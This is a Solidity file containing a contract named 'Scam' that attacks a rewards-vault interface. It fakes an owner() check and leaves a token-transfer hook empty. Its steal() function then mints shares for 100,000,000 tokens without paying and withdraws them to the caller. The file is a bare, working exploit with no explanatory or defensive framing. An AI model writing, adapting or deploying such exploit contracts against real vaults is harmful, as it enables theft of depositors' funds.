//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


interface _RewardsAdvisor {
    function withdraw(uint256 shares,address to,address payable from) external returns (uint256 rewards);

    function deposit(uint256 farmDeposit,address payable from,address to) external returns (uint256 shares);
}

contract Scam {

    _RewardsAdvisor rewardsAdvisor;
    uint256 public depositAmount = 100000000 * 1e18;

    constructor(address _rewardsAdvisor) {
        rewardsAdvisor = _RewardsAdvisor(_rewardsAdvisor);
    }

    function owner() external returns (address) {
        return address(this);
    }
    function delegatedTransferERC20(address token, address to, uint256 amount) external {
    }

    function steal() external {
        uint256 shares = rewardsAdvisor.deposit(depositAmount, payable(address(this)), address(this));
        rewardsAdvisor.withdraw(shares, msg.sender, payable(address(this)));
    }

}